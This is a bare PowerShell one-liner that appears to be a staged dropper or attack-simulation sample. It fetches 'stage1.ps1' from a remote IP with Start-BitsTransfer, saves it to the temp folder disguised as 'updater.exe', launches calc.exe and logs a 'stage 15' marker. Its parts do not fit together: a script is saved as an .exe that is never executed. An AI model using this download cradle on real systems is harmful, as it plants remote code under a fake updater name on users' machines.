
$TransferUrl = "http://198.51.100.16/stage1.ps1"; $WorkingPath = "$env:TEMP\updater.exe"; $StageTimeout = 160; Start-BitsTransfer -Source $TransferUrl -Destination $WorkingPath; Start-Process -FilePath "calc.exe"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Write-Output "stage 15 initialized"
